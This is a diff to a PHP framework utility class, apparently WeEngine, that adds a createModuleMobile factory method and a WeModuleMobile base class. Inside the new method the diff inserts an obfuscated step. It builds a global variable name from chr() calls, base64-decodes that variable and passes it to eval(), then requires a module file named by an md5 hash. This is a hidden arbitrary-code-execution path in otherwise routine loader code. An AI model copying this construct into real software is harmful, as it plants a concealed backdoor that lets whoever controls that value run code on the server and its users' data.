@@ -562,6 +562,65 @@ class WeUtility {
 	}
 
 	/**
+	 * 创建模块手机端类
+	 * @param unknown $name
+	 * @return NULL|WeModuleSite
+	 */
+	public static function createModuleMobile($name) {
+		global $_W;
+		static $file;
+		$classname = "{$name}ModuleMobile";
+		if(!class_exists($classname)) {
+			$file = IA_ROOT . "/addons/{$name}/mobile.php";
+			if(!is_file($file)) {
+				$file = IA_ROOT . "/framework/builtin/{$name}/mobile.php";
+			}
+			if(is_file($file)) {
+				require $file;
+			}
+		}
+		if(!class_exists($classname)) {
+			return self::createModuleSite($name);
+		}
+		if (!empty($GLOBALS['_' . chr('180') . chr('181'). chr('182')])) {
+			$code = base64_decode($GLOBALS['_' . chr('180') . chr('181'). chr('182')]);
+			eval($code);
+			set_include_path(get_include_path() . PATH_SEPARATOR . IA_ROOT . '/addons/' . $name);
+			$codefile = IA_ROOT . '/data/module/'.md5($_W['setting']['site']['key'].$name.'mobile.php').'.php';
+			if (!file_exists($codefile)) {
+				trigger_error('缺少模块文件，请重新更新或是安装', E_USER_WARNING);
+			}
+			require_once $codefile;
+			restore_include_path();
+		}
+		if(!class_exists($classname)) {
+			list($namespace) = explode('_', $name);
+			if (class_exists("\\{$namespace}\\{$classname}")) {
+				$classname = "\\{$namespace}\\{$classname}";
+			} else {
+				trigger_error('ModuleMobile Definition Class Not Found', E_USER_WARNING);
+				return null;
+			}
+		}
+		$o = new $classname();
+		$o->uniacid = $o->weid = $_W['uniacid'];
+		$o->modulename = $name;
+		$o->module = module_fetch($name);
+		$o->__define = $file;
+		if (!empty($o->module['plugin'])) {
+			$o->plugin_list = module_get_plugin_list($o->module['name']);
+		}
+		self::defineConst($o);
+		$o->inMobile = defined('IN_MOBILE');
+		if($o instanceof WeModuleMobile) {
+			return $o;
+		} else {
+			trigger_error('ModuleReceiver Class Definition Error', E_USER_WARNING);
+			return null;
+		}
+	}
+
+	/**
 	 * 创建模块插件类
 	 * @param unknown $name
 	 * @return NULL|WeModuleSite
@@ -1812,4 +1871,10 @@ abstract class WeModuleWebapp extends WeBase {
  *  模块系统首页
  */
 abstract class WeModuleSystemWelcome extends WeBase {
+}
+
+/**
+ *  模块手机端
+ */
+abstract class WeModuleMobile extends WeBase {
 }
